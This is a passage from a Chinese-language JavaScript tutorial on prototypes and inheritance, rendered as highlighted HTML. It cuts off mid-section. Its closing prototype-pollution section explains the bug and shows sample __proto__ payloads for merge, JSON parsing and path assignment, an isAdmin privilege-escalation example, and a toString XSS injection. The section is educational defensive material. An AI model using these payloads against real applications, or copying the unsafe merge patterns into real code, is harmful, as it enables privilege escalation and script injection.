class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br>  prototype.<span class="hljs-property">constructor</span> = child;<br>  child.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = prototype;<br>&#125;<br><br><span class="hljs-comment">// 父类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-comment">// 子类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, breed</span>) &#123;<br>  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;<br>&#125;<br><br><span class="hljs-comment">// 继承</span><br><span class="hljs-title function_">inheritPrototype</span>(<span class="hljs-title class_">Dog</span>, <span class="hljs-title class_">Animal</span>);<br><br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Woof!&#x27;</span>);<br>&#125;;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&#x27;Max&#x27;</span>, <span class="hljs-string">&#x27;Labrador&#x27;</span>);<br>myDog.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// &quot;Max&quot;</span><br>myDog.<span class="hljs-title function_">bark</span>();    <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>优势</strong></p><ul><li>只调用一次父类构造函数</li><li>原型链保持不变</li><li>能够正常使用 instanceof 和 isPrototypeOf</li></ul><h2 id="5-4-ES6-class-语法与原型链的关系"><a href="#5-4-ES6-class-语法与原型链的关系" class="headerlink" title="5.4 ES6 class 语法与原型链的关系"></a>5.4 ES6 <code>class</code> 语法与原型链的关系</h2><p><strong>代码实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>  <br>  <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, breed</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// 调用父类构造函数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;<br>  &#125;<br>  <br>  <span class="hljs-title function_">bark</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Woof!&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&#x27;Buddy&#x27;</span>, <span class="hljs-string">&#x27;Golden Retriever&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Buddy&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">bark</span>());    <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong></p><ul><li>这本质上是语法糖，底层仍然是基于原型的继承</li><li>extends 关键字自动设置了原型链</li><li>super() 必须在使用 this 之前调用</li></ul><h1 id="第六章：原型相关方法与操作"><a href="#第六章：原型相关方法与操作" class="headerlink" title="第六章：原型相关方法与操作"></a>第六章：原型相关方法与操作</h1><h2 id="6-1-Object-create-与纯净对象"><a href="#6-1-Object-create-与纯净对象" class="headerlink" title="6.1 Object.create() 与纯净对象"></a>6.1 <code>Object.create()</code> 与纯净对象</h2><p>Object.create 是 JavaScript 中创建新对象的方法，它允许你明确指定新对象的原型</p><p><strong>基本语法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto[, propertiesObject])<br></code></pre></td></tr></table></figure><ul><li>proto：新创建对象的原型对象（必须为对象或 null）</li><li>propertiesObject（可选）：属性描述符集合（同 Object.defineProperties() 的第二个参数）</li></ul><p><strong>纯净对象</strong></p><p>纯净对象是指没有原型链（<code>__proto__</code>为 null）的对象，创建方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> pureObject = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>其特点有：</p><ul><li>无原型，防止污染</li><li>无任何默认属性和方法</li><li>属性查找更快，只需查找自身属性</li><li>更安全的属性存储</li></ul><h2 id="6-2-Object-getPrototypeOf-和-Object-setPrototypeOf"><a href="#6-2-Object-getPrototypeOf-和-Object-setPrototypeOf" class="headerlink" title="6.2 Object.getPrototypeOf() 和 Object.setPrototypeOf()"></a>6.2 <code>Object.getPrototypeOf()</code> 和 <code>Object.setPrototypeOf()</code></h2><p><strong>基本概念</strong></p><ul><li>Object.getPrototypeOf() 方法用于获取指定对象的原型（即内部 [[Prototype]] 属性的值）</li><li>Object.setPrototypeOf() 方法设置一个指定对象的原型（即内部 [[Prototype]] 属性）到另一个对象或 null。</li></ul><p><strong>语法和参数</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj)<br><span class="hljs-comment">// obj：要获取其原型的对象，注意，如果参数不是对象，会强制转为对象</span><br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, prototype)<br><span class="hljs-comment">// obj：要设置其原型的对象</span><br><span class="hljs-comment">// prototype：该对象的新原型（必须为对象或 null）</span><br></code></pre></td></tr></table></figure><p><strong>返回值</strong></p><ul><li>Object.getPrototypeOf()：返回给定对象的原型（可能是对象或 null）</li><li>Object.setPrototypeOf()：返回设置新原型后的对象</li></ul><h2 id="6-3-instanceof-的原理与局限性"><a href="#6-3-instanceof-的原理与局限性" class="headerlink" title="6.3 instanceof 的原理与局限性"></a>6.3 <code>instanceof</code> 的原理与局限性</h2><p>instanceof 是 JavaScript 中用于检查对象原型链的操作符，其核心功能是检查构造函数的 prototype 属性是否出现在对象的原型链上</p><p><strong>语法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">object <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Constructor</span><br></code></pre></td></tr></table></figure><p><strong>内部实现机制</strong></p><p>instanceof 的底层行为可以用以下伪代码表示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">instanceOf</span>(<span class="hljs-params">obj, Constructor</span>) &#123;<br>  <span class="hljs-comment">// 获取对象的原型</span><br>  <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);<br>  <br>  <span class="hljs-comment">// 获取构造函数的 prototype 对象</span><br>  <span class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;<br>  <br>  <span class="hljs-comment">// 沿着原型链向上查找</span><br>  <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (proto === prototype) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>实际示例分析</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>其执行过程为：</p><ol><li>获取 <code>p.__proto__</code>（指向 Person.prototype）</li><li>比较 Person.prototype 和 Person.prototype -&gt; 匹配成功</li></ol><p><strong>主要局限性</strong></p><p>（1）跨执行环境问题（iframe&#x2F;window）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;!-- 主页面 --&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();</span></span><br><span class="language-javascript"><span class="language-xml">  </span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-comment">// 创建iframe并获取其Array构造函数</span></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(iframe);</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> <span class="hljs-title class_">IframeArray</span> = iframe.<span class="hljs-property">contentWindow</span>.<span class="hljs-property">Array</span>;</span></span><br><span class="language-javascript"><span class="language-xml">  </span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">IframeArray</span>); <span class="hljs-comment">// false</span></span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>原因：不同执行环境有其各自独立的全局对象和构造函数</p><p>（2）原始类型检测不可靠</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">123</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Number</span>);    <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">true</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Boolean</span>);  <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>原因：原始类型不是对象，除非用包装对象</p><p>（3）构造函数 prototype 被修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br><span class="hljs-comment">// 修改原型后</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>（4）对象原型被手动修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_">A</span>();<br><br><span class="hljs-comment">// 修改原型链</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> A); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> B); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（5）对纯净对象无效</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> pureObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pureObj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h2 id="6-4-hasOwnProperty-与-in-操作符的区别"><a href="#6-4-hasOwnProperty-与-in-操作符的区别" class="headerlink" title="6.4 hasOwnProperty 与 in 操作符的区别"></a>6.4 <code>hasOwnProperty</code> 与 <code>in</code> 操作符的区别</h2><p><strong>核心区别</strong></p><table><thead><tr><th align="left">特性</th><th align="left">hasOwnProperty</th><th align="left">in 操作符</th></tr></thead><tbody><tr><td align="left">检测范围</td><td align="left">仅对象自身属性</td><td align="left">自身属性 + 原型链属性</td></tr><tr><td align="left">继承方法</td><td align="left">来自 Object.prototype</td><td align="left">JavaScript 语言操作符</td></tr><tr><td align="left">对纯净对象</td><td align="left">需要外部调用（Object.prototype.hasOwnProperty.call）</td><td align="left">可直接使用</td></tr><tr><td align="left">ES6+替代方案</td><td align="left">Object.hasOwn()</td><td align="left">Reflect.has()</td></tr></tbody></table><p><strong>深度解析</strong></p><p>（1）hasOwnProperty 实现原理（伪代码）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-params">obj, prop</span>) &#123;<br>  <span class="hljs-comment">// 获取对象的所有自有属性</span><br>  <span class="hljs-keyword">const</span> ownKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(obj).<span class="hljs-title function_">concat</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(obj));<br>  <span class="hljs-keyword">return</span> ownKeys.<span class="hljs-title function_">includes</span>(prop);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）in 操作符实现原理（伪代码）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">inOperator</span>(<span class="hljs-params">obj, prop</span>) &#123;<br>  <span class="hljs-keyword">while</span> (obj !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(obj, prop)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关键差异对比</strong></p><p>（1）原型链处理差异</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;Proto&#x27;</span>;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;name&#x27;</span>)); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> p);             <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（2）属性描述符影响</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parent = &#123;&#125;;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(parent, <span class="hljs-string">&#x27;secret&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-number">123</span>,<br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span><br>&#125;);<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;secret&#x27;</span>)); <span class="hljs-comment">// false ❗️(正确，非自有属性)</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;secret&#x27;</span> <span class="hljs-keyword">in</span> child);             <span class="hljs-comment">// true ❗️(能检测到继承属性)</span><br></code></pre></td></tr></table></figure><h1 id="第七章：高级原型应用"><a href="#第七章：高级原型应用" class="headerlink" title="第七章：高级原型应用"></a>第七章：高级原型应用</h1><h2 id="7-1-原型污染与安全问题"><a href="#7-1-原型污染与安全问题" class="headerlink" title="7.1 原型污染与安全问题"></a>7.1 原型污染与安全问题</h2><p><strong>基本概念</strong></p><p>原型污染是指攻击者通过某种方式修改 JavaScript 对象的原型（通常是 Object.prototype），从而影响所有基于该原型的对象行为的安全漏洞</p><p><strong>污染原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 正常对象</span><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;;<br><br><span class="hljs-comment">// 污染原型</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">true</span>;<br><br><span class="hljs-comment">// 所有对象现在都有isAdmin属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>常见的污染途径</strong></p><p>（1）不安全的对象合并</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> source) &#123;<br>    target[key] = source[key]; <span class="hljs-comment">// 可能覆盖原型属性</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> maliciousPayload = &#123;<br>  <span class="hljs-attr">__proto__</span>: &#123; <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">constructor</span>: &#123; <span class="hljs-attr">prototype</span>: &#123; <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125; &#125;<br>&#125;;<br><br><span class="hljs-title function_">merge</span>(&#123;&#125;, maliciousPayload);<br></code></pre></td></tr></table></figure><p>（2）不安全的 JSON 解析</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> maliciousJSON = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;&#x27;</span>;<br><span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(maliciousJSON); <span class="hljs-comment">// 在某些引擎中会污染原型</span><br></code></pre></td></tr></table></figure><p>（3）路径赋值操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params">obj, path, value</span>) &#123;<br>  <span class="hljs-keyword">const</span> parts = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>  <span class="hljs-keyword">let</span> current = obj;<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (!current[parts[i]]) &#123;<br>      current[parts[i]] = &#123;&#125;;<br>    &#125;<br>    current = current[parts[i]];<br>  &#125;<br>  <br>  current[parts[parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]] = value;<br>&#125;<br><br><span class="hljs-comment">// 攻击者可以传入恶意路径</span><br><span class="hljs-title function_">setValue</span>(&#123;&#125;, <span class="hljs-string">&#x27;__proto__.isAdmin&#x27;</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p><strong>安全影响分析</strong></p><p>（1）权限提升</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 假设系统检查权限的方式</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkPermission</span>(<span class="hljs-params">user</span>) &#123;<br>  <span class="hljs-keyword">if</span> (user.<span class="hljs-property">isAdmin</span>) &#123;<br>    <span class="hljs-title function_">grantAdminAccess</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 污染后所有用户都变成管理员</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-title function_">checkPermission</span>(&#123;&#125;); <span class="hljs-comment">// 获得管理员权限</span><br></code></pre></td></tr></table></figure><p>（2）XSS 攻击增强</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 污染toString方法</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;maliciousCode()&lt;/script&gt;&#x27;</span>;<br>&#125;;<br><br><span class="hljs-comment">// 当系统调用toString时</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = someObject.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// 执行恶意代码</span><br></code></pre></td></tr></table></figure><p>（3）服务端漏洞</p><figure class="highlight javascript"><table><tr><td 